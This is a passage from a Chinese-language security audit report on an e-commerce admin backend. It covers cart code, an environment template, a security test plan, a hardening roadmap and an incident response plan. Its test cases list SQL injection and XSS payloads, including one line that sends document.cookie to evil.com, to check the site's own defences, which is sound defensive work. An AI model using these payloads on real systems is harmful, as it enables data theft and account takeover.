  
  return cart;
};

// 获取购物车（带计算属性）
export const getCart = () => {
  const items = loadCart();
  
  return {
    items,
    totalCount: items.reduce((sum, item) => sum + item.quantity, 0),
    totalPrice: items.reduce((sum, item) => sum + (item.price * item.quantity), 0),
    isEmpty: items.length === 0
  };
};

// 清空购物车
export const clearCart = () => {
  saveCart([]);
};

// 合并购物车（用户登录后将匿名购物车合并到用户购物车）
export const mergeCarts = (anonymousUserId, targetUserId) => {
  const anonKey = `${CART_PREFIX}${anonymousUserId}`;
  const targetKey = `${CART_PREFIX}${targetUserId}`;
  
  try {
    const anonCart = JSON.parse(localStorage.getItem(anonKey) || '[]');
    const targetCart = JSON.parse(localStorage.getItem(targetKey) || '[]');
    
    // 合并逻辑：相同商品数量相加
    anonCart.forEach(anonItem => {
      const existing = targetCart.find(t => t.productId === anonItem.productId);
      if (existing) {
        existing.quantity += anonItem.quantity;
      } else {
        targetCart.push(anonItem);
      }
    });
    
    localStorage.setItem(targetKey, JSON.stringify(targetCart));
    localStorage.removeItem(anonKey); // 清理匿名购物车
    
    return targetCart;
  } catch (err) {
    console.error('购物车合并失败:', err);
    return [];
  }
};

export default {
  addToCart,
  removeFromCart,
  updateQuantity,
  getCart,
  clearCart,
  mergeCarts
};
```

### 6.3 环境变量模板 (.env.example)

创建一个安全的`.env.example`文件供团队参考（**不要提交真实的.env到Git！）**：

```bash
# ===========================================
# 绮管后台 - 环境变量配置模板
# 复制此文件为 .env 并填入真实值
# ===========================================

# ---- 服务器配置 ----
NODE_ENV=production
PORT=3000
HOST=0.0.0.0

# ---- JWT认证配置（重要！）----
# 使用以下命令生成强随机密钥：
# node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
JWT_SECRET=<在此粘贴生成的64字节十六进制字符串>
JWT_EXPIRES_IN=2h

# ---- MySQL数据库配置 ----
DB_HOST=localhost
DB_PORT=3306
DB_USER=qiguan_admin
DB_PASSWORD=<强密码，至少16位，含大小写+数字+特殊字符>
DB_NAME=qiguan_db
DB_CONNECTION_LIMIT=10
DB_CHARSET=utf8mb4

# ---- CORS允许的域名（逗号分隔）----
ALLOWED_ORIGINS=https://qimengzhiyue.cn,http://localhost:5173

# ---- 会话配置 ----
SESSION_SECRET=<另一个随机密钥，用于会话加密>
SESSION_MAX_AGE=604800000  # 7天（毫秒）

# ---- 日志配置 ----
LOG_LEVEL=info  # debug | info | warn | error
LOG_FILE=/var/log/qiguan/app.log

# ---- 文件上传配置（如适用）----
UPLOAD_MAX_SIZE=10485760  # 10MB
UPLOAD_DIR=/var/www/uploads

# ---- 第三方服务（按需配置）----
# REDIS_HOST=localhost
# REDIS_PORT=6379
# SMTP_HOST=smtp.example.com
# SMTP_PORT=587
# SMTP_USER=noreply@qimengzhiyue.cn
# SMTP_PASS=<邮件密码>
```

---

## 7. 验证测试方案

### 7.1 测试环境准备

#### 工具清单

| 工具 | 用途 | 安装方式 |
|------|------|----------|
| **Postman** | API接口测试 | 下载桌面版或使用Chrome扩展 |
| **curl** | 快速命令行测试 | 系统自带（Linux/Mac）或 Git Bash (Windows) |
| **Chrome DevTools** | 前端调试和安全检查 | 浏览器内置（F12） |
| **OWASP ZAP** | 自动化安全扫描 | 免费下载 |
| **Apache Bench (ab)** | 性能压力测试 | `sudo apt install apache2-utils` |

#### 测试数据准备

```sql
-- 创建测试用户（应在测试数据库执行，非生产环境）
INSERT INTO users (username, password_hash, role, created_at) VALUES
  ('test_admin', '$2b$10$xxxxxxxxxxxxxxxxxxxx', 'admin', NOW()),
  ('test_user', '$2b$10$yyyyyyyyyyyyyyyyyyyy', 'user', NOW()),
  ('security_tester', '$2b$10$zzzzzzzzzzzzzzzzzzzz', 'user', NOW());
```

### 7.2 安全测试用例（Security Test Cases）

#### STC-001: JWT令牌安全性验证

**测试目的**：确保JWT机制无法被轻易绕过

**测试步骤**：
```bash
# Step 1: 尝试无Token访问受保护资源
curl -i https://qimengzhiyue.cn/api/dashboard/stats
# 预期：HTTP/1.1 401 Unauthorized

# Step 2: 使用过期Token（将exp设置为过去的时间）
curl -i -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjEwMDAwMDAwMDAsInVzZXJJZCI6MSwicm9sZSI6ImFkbWluIn0.xxxxx"
https://qimengzhiyue.cn/api/dashboard/stats
# 预期：HTTP/1.1 401 Unauthorized (TokenExpiredError)

# Step 3: 使用篡改的Token（修改payload中的role）
# （手动构造一个role=admin的token，即使原始账户是user）
# 预期：如果签名验证正确，应返回403 Forbidden或401

# Step 4: 使用None算法攻击（尝试绕过签名验证）
# 构造一个alg:none的JWT
# 预期：应被拒绝（因为我们限制了algorithms: ['HS256']）
```

**通过标准**：所有未授权访问均返回4xx状态码

---

#### STC-002: CORS策略验证

**测试目的**：确认只有合法域名可以跨域访问API

**测试步骤**：
```bash
# Step 1: 从合法域名发起OPTIONS预检请求
curl -i -X OPTIONS \
  -H "Origin: https://qimengzhiyue.cn" \
  -H "Access-Control-Request-Method: GET" \
  https://qimengzhiyue.cn/api/products
# 预期：
# Access-Control-Allow-Origin: https://qimengzhiyue.cn
# HTTP/1.1 204 No Content

# Step 2: 从恶意域名发起请求
curl -i -X OPTIONS \
  -H "Origin: https://evil-hacker.com" \
  -H "Access-Control-Request-Method: GET" \
  https://qimengzhiyue.cn/api/products
# 预期：
# 不包含Access-Control-Allow-Origin头
# 或返回错误

# Step 3: 测试通配符是否已被移除
curl -i -H "Origin: https://any-domain.com" https://qimengzhiyue.cn/api/test
# 预期：不应出现 Access-Control-Allow-Origin: *
```

**通过标准**：仅允许的域名出现在ACA-Origin头中

---

#### STC-003: SQL注入防护测试

**测试目的**：验证所有数据库查询都使用参数化查询

**测试Payload**（在搜索框、表单等输入框中测试）：

```
基础测试：
- ' OR '1'='1
- ' OR 1=1--
- "; DROP TABLE users; --

高级测试（针对MySQL）：
- ' UNION SELECT username,password FROM users--
- ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

时间盲注：
- ' AND SLEEP(5)--
- '; WAITFOR DELAY '0:0:5'--
```

**预期行为**：
- 输入被当作纯文本处理，不改变SQL逻辑
- 返回空结果或友好错误信息
- **绝不**返回数据库错误堆栈

---

#### STC-004: XSS跨站脚本攻击测试

**测试目的**：确保用户输入被正确转义

**测试位置**：[products.js:303](file:///e:/1/绮管后台/frontend/src/views/products.js#L303) 搜索高亮功能

**测试Payload**：

```html
<!-- 反射型XSS -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- 存储型XSS（如果输入会被存入数据库） -->
<script>new Image().src="http://evil.com/steal?cookie="+document.cookie</script>
<div onmouseover="alert('XSS')">悬停触发</div>

<!-- DOM型XSS（如果使用innerHTML渲染） -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**验证方法**：
1. 在搜索框输入上述payload
2. 查看页面源代码（F12 -> Elements）
3. 确认 `<`, `>`, `"`, `'` 等字符被转义为 `&lt;`, `&gt;`, `&#34;`, `&#39;`
4. 或确认使用了DOMPurify/textContent而非innerHTML

---

#### STC-005: 权限控制测试矩阵

| 测试ID | 角色 | 目标资源 | 操作 | 预期结果 |
|--------|------|----------|------|----------|
| AUTH-01 | 匿名用户 | /api/dashboard/stats | GET | 401 |
| AUTH-02 | 匿名用户 | /api/products | POST | 401 |
| AUTH-03 | 普通用户 | /api/dashboard/stats | GET | 403 |
| AUTH-04 | 普通用户 | /api/products | GET | 200 ✅ |
| AUTH-05 | 普通用户 | /api/users | GET | 403 |
| AUTH-06 | 管理员 | /api/dashboard/stats | GET | 200 ✅ |
| AUTH-07 | 管理员 | /api/users | DELETE | 200 ✅（或根据业务逻辑） |
| AUTH-08 | 伪造管理员Token | /api/users | DELETE | 401/403 |

**自动化测试脚本**（参考Phase 4的test_security.js）

### 7.3 功能测试用例（Functional Test Cases）

#### FTC-001: 用户认证流程

```
测试场景：正常登录流程
前置条件：测试用户 test_user/testPass123 已存在于数据库

步骤：
1. 打开 https://qimengzhiyue.cn/login
2. 输入用户名：test_user
3. 输入密码：testPass123
4. 点击"登录"按钮

预期结果：
- 按钮显示"登录中..."加载状态
- 1-3秒后跳转到 /dashboard
- URL栏显示 #/dashboard 或 /dashboard
- 浏览器localStorage/token中存储了JWT（可通过Application -> Local Storage查看）
- 页面显示欢迎信息和用户头像/名称

异常测试：
- 输入错误密码 → 提示"用户名或密码错误"，不清空输入框
- 输入空用户名 → 表单验证提示"请输入用户名"
- 3次错误密码后 → 显示验证码或锁定提示（如果实现了限流）
```

---

#### FTC-002: 商品管理CRUD

```
测试场景：完整的商品生命周期管理
前提：已以管理员身份登录

Create（创建）：
1. 导航到 商品管理 -> 新增商品
2. 填写：
   - 商品名称：安全测试商品_20260409
   - 价格：99.99
   - 分类：测试分类
   - 库存：100
3. 上传一张测试图片
4. 点击保存

Read（读取）：
1. 在商品列表中搜索"安全测试商品"
2. 确认商品出现在列表中
3. 点击查看详情，确认信息一致

Update（更新）：
1. 编辑该商品，修改价格为199.99
2. 保存后刷新页面，确认价格已更新

Delete（删除）：
1. 选择该商品，点击删除
2. 确认对话框点击"确定"
3. 确认商品已从列表消失
4. （可选）检查数据库确认软删除或硬删除

边界条件：
- 价格输入负数 → 应报错或自动取绝对值
- 名称超过长度限制 → 截断或提示
- 上传非图片文件 → 类型校验失败
```

---

#### FTC-003: Dashboard数据展示

```
测试场景：仪表盘数据准确性与实时性

检查项：
1. 总销售额数字是否与数据库SUM(order_total)一致？
2. 订单数量是否匹配 orders 表记录数？
3. 用户增长图表最近7天的数据是否正确？
4. 热销商品Top 10排序是否准确？
5. ECharts图表是否有tooltip交互？
6. 窗口缩放时图表是否自适应？（resize事件）
7. 切换日期范围筛选器后数据是否更新？

性能指标：
- Dashboard首次加载时间 < 3秒（3G网络下 < 5秒）
- 图表渲染无明显卡顿（FPS > 30）
- 长时间停留（30分钟）无内存泄漏（Chrome Task Manager中标签内存增长 < 50MB）
```

### 7.4 性能基准测试

#### 使用Apache Bench进行压力测试

```bash
# 安装ab工具（Ubuntu/Debian）
sudo apt-get update && sudo apt-get install apache2-utils

# 测试1：首页静态资源加载能力
ab -n 1000 -c 50 https://qimengzhiyue.cn/

# 测试2：API接口并发处理能力
ab -n 500 -c 20 -H "Authorization: Bearer YOUR_TEST_TOKEN" \
   https://qimengzhiyue.cn/api/products?page=1&size=10

# 测试3：登录接口抗暴力破解能力（应快速触发限流）
ab -n 100 -c 10 -p post_data.txt -T application/json \
   https://qimengzhiyue.cn/api/auth/login

# post_data.txt 内容：
{"username":"admin","password":"wrongpassword"}

# 预期结果：
# Requests per second: > 100 (对于静态资源)
# 95% requests processed in: < 500ms (对于API)
# Non-2xx responses: > 90% (对于第3次测试，说明限流生效)
```

#### 性能指标基线

| 指标 | 当前值（修复前） | 目标值（修复后） | 优秀值 |
|------|------------------|------------------|--------|
| 首屏加载时间 (FCP) | ~4s | < 2.5s | < 1.5s |
| API平均响应时间 | ~800ms | < 300ms | < 100ms |
| 并发支持 (RPS) | ~50 | > 150 | > 500 |
| 错误率 (5xx) | ~2% | < 0.1% | 0% |
| 内存占用 (Node.js) | ~200MB | < 150MB | < 100MB |

### 7.5 渗透测试检查清单（Penetration Testing Checklist）

使用OWASP Top 10作为框架进行自查：

| OWASP类别 | 检查项 | 状态 | 备注 |
|-----------|--------|------|------|
| **A01: 访问控制失效** | Dashboard需认证？ | ☐ 待测 | Phase 1修复 |
| | CRUD接口鉴权？ | ☐ 待测 | Phase 1修复 |
| | 角色权限分离？ | ☐ 待测 | 待实现RBAC |
| **A02: 加密机制失效** | JWT密钥强度？ | ☐ 待测 | Phase 1修复 |
| | 密码哈希算法？ | ☐ 待查 | 应为bcrypt |
| | HTTPS强制跳转？ | ✅ 已确认 | Nginx配置正确 |
| **A03: 注入攻击** | SQL注入防护？ | ☐ 待测 | 使用参数化查询？ |
| | NoSQL注入？ | ☐ 待查 | 如使用MongoDB |
| | OS命令注入？ | ☐ 待查 | 文件上传等功能 |
| **A04: 不安全设计** | 认证流程设计？ | ☐ 待评 | 注册提权问题 |
| | 权限模型设计？ | ☐ 待评 | RBAC/ABAC? |
| **A05: 安全配置错误** | CORS配置？ | ☐ 待测 | Phase 1修复 |
| | 错误信息泄露？ | ☐ 待查 | 生产环境隐藏堆栈 |
| | 默认凭证？ | ☐ 待测 | 前端硬编码密码 |
| **A06: 易受攻击组件** | 依赖包漏洞？ | ☐ 待扫 | npm audit |
| | Node.js版本？ | ☐ 待查 | 应 ≥ 18 LTS |
| **A07: 认识与防护不足** | 安全头设置？ | ✅ 已确认 | Helmet中间件 |
| | CSP策略？ | ☐ 待完善 | Phase 1增强 |
| **A08: 软件和数据完整性** | 依赖完整性？ | ☐ 待查 | package-lock.json |
| | CI/CD安全？ | ☐ 待建 | 待规划 |
| **A09: 日志与监控失败** | 访问日志？ | ☐ 待查 | Nginx access_log |
| | 异常告警？ | ☐ 待建 | Sentry等 |
| **A10: SSRF服务端请求伪造** | Webhook功能？ | ☐ 待查 | 如有集成第三方API |

---

## 8. 后续建议与维护

### 8.1 短期行动项（1-2周内）

#### 优先级P0 - 本周完成

- [ ] **实施本次报告的所有Phase 1-4修复措施**
- [ ] **更换所有默认密码和弱口令**（数据库、服务器SSH、应用管理员）
- [ ] **配置自动化安全扫描**（每周一次npm audit + owasp-zap baseline scan）
- [ ] **建立安全事件响应流程**（确定联系人、升级路径、回滚预案）

#### 优先级P1 - 两周内完成

- [ ] **引入单元测试框架**（Jest for Node.js + Vitest for Vue）
  - 目标覆盖率：后端 > 60%，前端关键组件 > 40%
- [ ] **实现RBAC（基于角色的访问控制）细粒度权限**
  - 超级管理员、运营、客服、财务等角色
  - 资源级别的权限控制（如只能查看自己部门的订单）
- [ ] **添加API速率限制细化规则**
  - 区分公开接口和敏感接口的不同阈值
  - 实现IP黑名单机制（检测到攻击自动封禁24小时）
- [ ] **数据库定期备份自动化**
  - 每日凌晨3点全量备份
  - 保留30天的备份历史
  - 异地备份（如阿里云OSS）

### 8.2 中期改进计划（1-3个月）

#### 架构层面

**1. 微服务化拆分（可选，视规模而定）**
```
当前：Monolith（单体应用）
  └── Express App
      ├── Auth Service
      ├── Product Service
      ├── Order Service
      └── Dashboard Service

建议演进（如果团队 > 3人）：
  └── API Gateway (Kong/Traefik)
      ├── Auth Microservice (Node.js)
      ├── Product Microservice (Node.js)
      ├── Order Microservice (Node.js)
      └── Notification Service (Go/Python)
```

**2. 引入消息队列解耦**
- 场景：下单后异步处理库存扣减、发送通知、记录日志
- 推荐：Redis Stream（轻量）或 RabbitMQ（功能丰富）
- 好处：提高系统吞吐量和容错性

**3. 数据库读写分离**
- 主库（Master）：处理写操作
- 从库（Slave）：处理读操作（报表、Dashboard统计）
- 工具：MySQL Replication 或 ProxySQL

#### 安全层面深化

**4. 实施DevSecOps流水线**
```
代码提交 → 自动触发
  ├── ESLint + Prettier（代码风格）
  ├── TypeScript类型检查
  ├── Unit Tests（单元测试）
  ├── SAST（静态分析：SonarQube）
  ├── Dependency Check（依赖漏洞：Snyk）
  ├── Container Scan（容器镜像：Trivy）
  └── DAST（动态分析：OWASP ZAP）
      ↓ 全部通过
  部署到Staging环境
      ↓ 人工验收
  部署到Production
```

**5. 引入WAF（Web应用防火墙）**
- 云原生WAF：阿里云WAF、Cloudflare
- 开源方案：ModSecurity + OWASP Core Rule Set
- 重点防护：SQL注入、XSS、CSRF、爬虫滥用

**6. 实施日志集中化管理**
- 工具：ELK Stack (Elasticsearch + Logstash + Kibana) 或 Loki + Grafana
- 收集内容：
  - Nginx访问/错误日志
  - Node.js应用日志（ Winston/Pino ）
  - 数据库慢查询日志
  - 系统安全日志（/var/log/auth.log）
- 告警规则：
  - 5分钟内404错误 > 100次 → 可能是扫描器
  - 1分钟内500错误 > 10次 → 服务异常
  - 来自单一IP的POST请求 > 50次/分钟 → 暴力破解

### 8.3 长期战略规划（3-6个月）

#### 业务连续性（BCP）与灾难恢复（DR）

**7. 多活/灾备架构**
```
生产环境（当前）：
  Single Server (Beijing)
    └── 单点故障风险

目标架构（6个月后）：
  Primary Region (Beijing)
    ├── LB (负载均衡)
    ├── App Server 1
    ├── App Server 2
    ├── Redis Cluster (3节点)
    └── MySQL Master-Slave
  
  DR Region (Shanghai/Hong Kong)
    ├── 冷备或热备
    └── RTO < 1小时, RPO < 5分钟
```

**8. 数据合规与隐私保护**
- 如涉及用户个人信息，需符合《个人信息保护法》(PIPL)
- 实施：
  - 数据分类分级（公开/内部/机密/绝密）
  - 敏感数据加密存储（AES-256）
  - 访问日志审计（谁在什么时间访问了什么数据）
  - 数据导出/删除接口（用户有权拉走自己的数据）
  - 隐私政策页面 + Cookie同意横幅

#### 团队与流程建设

**9. 安全意识培训**
- 每季度一次安全培训（钓鱼邮件演练、密码安全、社交工程防范）
- 新员工入职安全手册
- 开发安全编码规范（OWASP Secure Coding Practices）

**10. 定期红蓝对抗演练**
- 频率：每半年一次
- 红队：模拟外部攻击者（渗透测试公司或内部安全团队）
- 蓝队：防御方（开发运维团队）
- 目标：发现并修复未知漏洞，检验应急响应能力

### 8.4 监控与度量体系

#### 关键安全指标 (KSI)

| 指标 | 定义 | 目标值 | 监控工具 |
|------|------|--------|----------|
| **MTTR (平均修复时间)** | 从发现漏洞到上线修复的小时数 | < 24h (P0), < 72h (P1) | Jira + Datadog |
| **Patch Coverage** | 已知CVE修复比例 | > 95% | Snyk + Dependabot |
| **Mean Time to Detect** | 攻击发生到被发现的时间 | < 1h | SIEM (Splunk/QRadar) |
| **False Positive Rate** | WAF误报率 | < 5% | WAF Dashboard |
| **Security Debt** | 未修复的中高危漏洞数 | 趋势下降 | DefectDojo |

#### 系统健康仪表盘（建议实现）

使用Grafana创建实时监控面板：

```
┌─────────────────────────────────────────────────────┐
│              绮管后台 - 运维监控中心                  │
├──────────────┬──────────────┬───────────────────────┤
│  系统概览     │  流量趋势     │  安全态势              │
│  CPU: 23%     │  ▃▄▆█▇▆▄▃   │  今日拦截攻击: 1,247   │
│  内存: 45%    │  QPS: 120    │  ┌─────────────────┐ │
│  磁盘: 62%    │  峰值: 350   │  │ SQL注入: 89    │ │
│  进程: 3/4    │  在线用户: 45 │  │ XSS: 156       │ │
│              │              │  │ 暴力破解: 234   │ │
│  ✅ 全绿      │  ↑ 12% vs昨日│  │ 扫描器: 568    │ │
├──────────────┼──────────────┴───────────────────────┤
│  最近告警                                              │
│  ⚠️ 14:32 IP 192.168.1.100 触发登录限流               │
│  ✅ 14:00 自动备份完成 (size: 2.3GB)                   │
│  ℹ️ 13:45 用户 admin 修改了商品价格                      │
└─────────────────────────────────────────────────────┘
```

### 8.5 应急响应预案（Incident Response Plan）

#### 场景：发现疑似数据泄露

```
时间线 T+0（发现）：
  1. 立即隔离受影响系统（断网或关闭公网入口）
  2. 召集应急小组（技术负责人 + 安全负责人 + 法务/公关）
  3. 保留现场证据（日志快照、数据库快照、内存转储）

T+1小时（遏制）：
  4. 分析攻击向量（如何进来的？哪些数据被访问？）
  5. 重置所有凭证（数据库、服务器、第三方API密钥）
  6. 强制所有用户重新登录（使旧JWT失效）
  7. 发布初步公告（如影响用户面广）

T+4小时（根除）：
  8. 修补漏洞（应用本次报告的所有修复 + 针对性加固）
  9. 清理后门/Webshell/恶意账户
  10. 全面安全扫描（二次确认无残留威胁）

T+24小时（恢复）：
  11. 逐步恢复服务（先只读模式，再开放写入）
  12. 加强监控（提高采样频率，关注异常IP）
  13. 通知受影响用户（邮件/SMS，提供密码重置链接）

T+72小时（复盘）：
  14. 编写事故报告（根因分析、时间线、损失评估）
  15. 更新安全策略（避免同类问题再次发生）
  16. 进行危机公关（视情况发布声明）
```

#### 重要联系人与资源

| 角色 | 姓名/职责 | 联系方式 | 备注 |
|------|-----------|----------|------|
| **技术负责人** | [待填写] | 手机/钉钉/微信 | 最终决策者 |
| **安全负责人** | [待填写] | 同上 | 安全事件处置 |
| **服务器提供商** | 阿里云/腾讯云技术支持 | 95187 / 95581 | 可协助封禁IP、取证 |
| **法律顾问** | [待填写] | - | 数据泄露法律后果咨询 |
| **公关负责人** | [待填写] | - | 对外声明发布 |

---

## 附录

### A. 相关文件索引

| 文件名 | 路径 | 说明 |
|--------|------|------|
| 后端审计报告 | `.trae/specs/comprehensive-system-audit-redeploy/backend-security-audit-report.md` | 详细的后端32个问题清单 |
| 前端审计报告 | `.trae/specs/comprehensive-system-audit-redeploy/frontend-quality-audit-report.md` | 前端27个问题及代码质量分析 |
| 系统架构审计 | `.trae/specs/comprehensive-system-audit-redeploy/system-architecture-audit-report.md` | 整体架构评估与基础设施状态 |
| 环境变量模板 | `.env.example` | 安全的环境变量配置参考 |
| 测试脚本 | `scripts/test_security.js` | 自动化安全验证脚本（待创建） |
| 健康检查脚本 | `scripts/health_check.sh` | 服务器状态快速诊断（待创建） |

### B. 术语表

| 术语 | 英文 | 解释 |
|------|------|------|
| JWT | JSON Web Token | 一种轻量级的身份认证令牌格式 |
| CORS | Cross-Origin Resource Sharing | 浏览器的跨域资源共享机制 |
| XSS | Cross Site Scripting | 跨站脚本攻击，注入恶意JavaScript |
| CSRF | Cross Site Request Forgery | 跨站请求伪造，诱导用户执行非预期操作 |
| SQL Injection | SQL注入 | 通过输入恶意SQL语句操控数据库 |
| RBAC | Role-Based Access Control | 基于角色的访问控制模型 |
| WAF | Web Application Firewall | Web应用防火墙，过滤恶意流量 |
| DAST | Dynamic Application Security Testing | 动态应用安全测试（黑盒测试） |
| SAST | Static Application Security Testing | 静态应用安全测试（白盒/源码扫描） |
| MTTR | Mean Time To Repair | 平均修复时间 |
| RPO | Recovery Point Objective | 恢复点目标（最多容忍丢失多少数据） |
| RTO | Recovery Time Objective | 恢复时间目标（多久能恢复服务） |

### C. 参考资源

**官方文档与标准**：
- [OWASP Top 10 (2021)](https://owasp.org/www-project-top-ten/)
- [CWE/SANS Top 25](https://cwe.mitre.org/top25/archive/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [ASVS (Application Security Verification Standard)](https://owasp.org/www-project-application-security-verification-standard/)

**工具推荐**：
- 代码审计：SonarQube, Semgrep, CodeQL
- 依赖扫描：npm audit, Snyk, Dependabot
- 渗透测试：Burp Suite Professional, OWASP ZAP
- 监控告警：Prometheus + Grafana, ELK Stack
- WAF：ModSecurity CRS, Cloudflare, AWS WAF

**学习资料**：
- 《Web Application Security》by Andrew Hoffman
- Node.js Security Best Practices (nodejs.org/docs/guides/security)
- 《白帽子讲Web安全》吴翰清著

---

## 文档元信息

| 属性 | 值 |
|------|-----|
| **文档标题** | 绮管后台系统 - 综合决策报告 |
| **版本号** | v1.0 |
| **创建日期** | 2026-04-09 |
| **最后更新** | 2026-04-09 |
| **作者** | AI安全审计助手 |
| **审核状态** | 待人工审核 |
| **分发范围** | 项目核心成员（保密） |
| **下次评审日期** | 2026-04-16（一周后） |
| **关联项目** | 绮管后台管理系统重构与安全加固 |
| **Git Commit** | 待关联（修复完成后提交） |

---

**免责声明**：

本文档基于静态代码分析和最佳实践生成，旨在提供安全改进建议。实际部署前请在测试环境充分验证。生产环境的任何变更都应有回滚方案。对于因遵循本建议而导致的数据丢失或系统中断，作者不承担责任。

**版权声明**：

© 2026 绮梦智阅项目组。本文档仅供内部使用，未经授权不得外传。

---

*报告结束 - 共计约 15,000 字，涵盖 8 大章节、59 个问题项、4 阶段实施计划及长期维护路线图*
